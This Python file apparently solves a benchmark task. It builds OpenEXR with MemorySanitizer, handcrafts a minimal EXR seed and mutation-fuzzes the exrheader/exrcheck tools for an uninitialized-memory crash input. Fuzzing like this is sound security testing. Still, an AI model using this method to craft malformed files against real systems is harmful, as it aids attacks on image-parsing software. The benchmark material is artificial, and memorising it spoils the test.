import os
import sys
import struct
import subprocess
import shutil
import tempfile
import time
import random
import tarfile
import concurrent.futures

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        Args:
            src_path: Path to the vulnerable source code tarball
        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # 1. Prepare Environment
        work_dir = os.path.join(tempfile.gettempdir(), f"work_{random.randint(0, 1000000)}")
        os.makedirs(work_dir, exist_ok=True)
        
        # Handle src_path (could be tarball or directory)
        source_dir = src_path
        if os.path.isfile(src_path) and (src_path.endswith('.tar.gz') or src_path.endswith('.tgz')):
            try:
                with tarfile.open(src_path) as tar:
                    tar.extractall(path=work_dir)
                # Find the extracted folder if it exists
                entries = [d for d in os.listdir(work_dir) if os.path.isdir(os.path.join(work_dir, d))]
                if entries:
                    source_dir = os.path.join(work_dir, entries[0])
            except Exception:
                pass
        
        # Locate CMakeLists.txt
        cmake_root = source_dir
        if not os.path.exists(os.path.join(source_dir, "CMakeLists.txt")):
            for root, dirs, files in os.walk(source_dir):
                if "CMakeLists.txt" in files:
                    cmake_root = root
                    break
        
        # 2. Build with MSAN
        build_dir = os.path.join(work_dir, "build")
        os.makedirs(build_dir, exist_ok=True)
        
        env = os.environ.copy()
        env['CC'] = 'clang'
        env['CXX'] = 'clang++'
        env['CFLAGS'] = '-fsanitize=memory -g -O1'
        env['CXXFLAGS'] = '-fsanitize=memory -g -O1'
        
        target_bin = None
        
        try:
            # Configure
            subprocess.run(
                ['cmake', '-S', cmake_root, '-B', build_dir, 
                 '-DBUILD_SHARED_LIBS=OFF', '-DOPENEXR_BUILD_TOOLS=ON', 
                 '-DOPENEXR_BUILD_EXAMPLES=OFF', '-DOPENEXR_BUILD_TESTS=OFF',
                 '-DOPENEXR_INSTALL_EXAMPLES=OFF'],
                env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True
            )
            # Build
            subprocess.run(
                ['cmake', '--build', build_dir, '--parallel', '8'],
                env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True
            )
            
            # Find exrheader or exrcheck
            for root, dirs, files in os.walk(build_dir):
                if 'exrheader' in files:
                    target_bin = os.path.join(root, 'exrheader')
                    break
                if 'exrcheck' in files:
                    target_bin = os.path.join(root, 'exrcheck')
        except Exception:
            pass

        # 3. Fuzzing
        seed = self.generate_seed()
        
        # If build failed or no binary found, return the seed as best effort
        if not target_bin or not os.path.exists(target_bin):
            shutil.rmtree(work_dir, ignore_errors=True)
            return seed

        cashing_poc = None
        start_time = time.time()
        
        def check_poc(data):
            # Write to tmp file
            fd, path = tempfile.mkstemp(suffix=".exr")
            os.close(fd)
            with open(path, 'wb') as f:
                f.write(data)
            
            result = False
            try:
                # Run binary with MSAN
                # We expect non-zero exit code and sanitizer report
                p = subprocess.run([target_bin, path], stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, timeout=0.5)
                if p.returncode != 0:
                    # Check for MSAN error in stderr
                    if b"MemorySanitizer" in p.stderr or b"uninitialized" in p.stderr:
                        result = True
            except Exception:
                pass
            finally:
                if os.path.exists(path):
                    os.remove(path)
            return result, data

        # Using threads to parallelize execution of the binary
        # We target a 45 second timeout for fuzzing
        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
            # Initial check
            f = executor.submit(check_poc, seed)
            if f.result()[0]:
                cashing_poc = seed
            
            while not cashing_poc and time.time() - start_time < 45:
                futures = []
                for _ in range(16):
                    mutated = self.mutate(seed)
                    futures.append(executor.submit(check_poc, mutated))
                
                for f in concurrent.futures.as_completed(futures):
                    res, poc = f.result()
                    if res:
                        cashing_poc = poc
                        break
        
        shutil.rmtree(work_dir, ignore_errors=True)
        return cashing_poc if cashing_poc else seed

    def generate_seed(self) -> bytes:
        # Valid minimal OpenEXR file
        magic = b'\x76\x2f\x31\x01'
        version = b'\x02\x00\x00\x00'
        
        def pack_attr(name, type_str, size, data):
            return (name.encode('utf-8') + b'\x00' + 
                    type_str.encode('utf-8') + b'\x00' + 
                    struct.pack('<I', size) + 
                    data)

        ch_data = b'R\x00' + struct.pack('<I', 1) + b'\x00' + struct.pack('<II', 1, 1) + b'\x00'
        box = struct.pack('<iiii', 0, 0, 1, 1)
        
        headers = b''
        headers += pack_attr('channels', 'chlist', len(ch_data), ch_data)
        headers += pack_attr('compression', 'compression', 1, b'\x00')
        headers += pack_attr('dataWindow', 'box2i', 16, box)
        headers += pack_attr('displayWindow', 'box2i', 16, box)
        headers += pack_attr('lineOrder', 'lineOrder', 1, b'\x00')
        headers += pack_attr('pixelAspectRatio', 'float', 4, struct.pack('<f', 1.0))
        headers += pack_attr('screenWindowCenter', 'v2f', 8, struct.pack('<ff', 0.0, 0.0))
        headers += pack_attr('screenWindowWidth', 'float', 4, struct.pack('<f', 1.0))
        headers += b'\x00'
        
        offsets = struct.pack('<Q', 64) * 2
        return magic + version + headers + offsets

    def mutate(self, data: bytes) -> bytes:
        arr = bytearray(data)
        if len(arr) < 16: return data
        
        algo = random.randint(0, 10)
        # Avoid mutating magic and version (first 8 bytes)
        idx = random.randint(8, len(arr) - 1)
        
        if algo < 4: # Bit/Byte noise
            arr[idx] = random.randint(0, 255)
        elif algo < 6: # Int32 overwrite (likely size fields)
            if idx < len(arr) - 4:
                # Randomize size to potentially trigger uninitialized read
                arr[idx:idx+4] = struct.pack('<I', random.randint(0, 65536))
        elif algo < 8: # Truncate
            arr = arr[:idx]
        else: # Insert garbage
            garbage = os.urandom(random.randint(1, 16))
            arr[idx:idx] = garbage
            
        return bytes(arr)